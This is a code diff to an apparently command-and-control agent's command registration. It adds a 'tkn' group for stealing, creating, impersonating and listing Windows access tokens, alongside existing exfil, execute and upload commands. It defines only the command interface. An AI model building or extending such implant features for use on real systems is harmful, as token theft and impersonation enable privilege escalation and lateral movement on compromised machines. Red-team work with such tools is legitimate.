@@ -39,6 +39,23 @@ function RegisterCommands(listenerType)
 
     let cmd_screenshot = ax.create_command("screenshot", "Capture a screenshot of the current display", "screenshot", "Task: capture screenshot");
 
+    let _cmd_tkn_steal = ax.create_command("steal", "Steal a token from a process", "tkn steal 1234", "Task: steal token");
+    _cmd_tkn_steal.addArgInt("pid", true);
+    let _cmd_tkn_make = ax.create_command("make", "Create a token with credentials", "tkn make DOMAIN user pass", "Task: make token");
+    _cmd_tkn_make.addArgString("domain", false);
+    _cmd_tkn_make.addArgString("username", true);
+    _cmd_tkn_make.addArgString("password", true);
+    let _cmd_tkn_impersonate = ax.create_command("impersonate", "Impersonate a stored token", "tkn impersonate 1", "Task: impersonate");
+    _cmd_tkn_impersonate.addArgInt("id", true);
+    let _cmd_tkn_revert = ax.create_command("revert", "Revert to the original token", "tkn revert", "Task: revert token");
+    let _cmd_tkn_list = ax.create_command("list", "List stored tokens", "tkn list", "Task: list tokens");
+    let _cmd_tkn_remove = ax.create_command("remove", "Remove a stored token", "tkn remove 1", "Task: remove token");
+    _cmd_tkn_remove.addArgInt("id", true);
+    let _cmd_tkn_getuid = ax.create_command("getuid", "Identity of the current (thread) token", "tkn getuid", "Task: get UID");
+    let _cmd_tkn_privs = ax.create_command("privs", "List the current token's privileges", "tkn privs", "Task: list privileges");
+    let cmd_tkn = ax.create_command("tkn", "Token manipulation");
+    cmd_tkn.addSubCommands([_cmd_tkn_steal, _cmd_tkn_make, _cmd_tkn_impersonate, _cmd_tkn_revert, _cmd_tkn_list, _cmd_tkn_remove, _cmd_tkn_getuid, _cmd_tkn_privs]);
+
     let _cmd_ps_list = ax.create_command("list", "List of processes", "ps list", "Task: show process list");
     let _cmd_ps_kill = ax.create_command("kill", "Kill a process", "ps kill 1234", "Task: kill process");
     _cmd_ps_kill.addArgInt("pid", true);
@@ -89,7 +106,7 @@ function RegisterCommands(listenerType)
     cmd_terminate.addSubCommands([_cmd_terminate_thread, _cmd_terminate_process]);
 
     if(listenerType == "BeaconHTTP") {
-        let commands_http = ax.create_commands_group("specter-rs", [cmd_pwd, cmd_cd, cmd_ls, cmd_cat, cmd_mkdir, cmd_rm, cmd_cp, cmd_mv, cmd_getuid, cmd_disks, cmd_screenshot, cmd_ps, cmd_jobs, cmd_download, cmd_upload, cmd_exfil, cmd_execute, cmd_sleep, cmd_terminate]);
+        let commands_http = ax.create_commands_group("specter-rs", [cmd_pwd, cmd_cd, cmd_ls, cmd_cat, cmd_mkdir, cmd_rm, cmd_cp, cmd_mv, cmd_getuid, cmd_disks, cmd_screenshot, cmd_tkn, cmd_ps, cmd_jobs, cmd_download, cmd_upload, cmd_exfil, cmd_execute, cmd_sleep, cmd_terminate]);
         return { commands_windows: commands_http }
     }
 
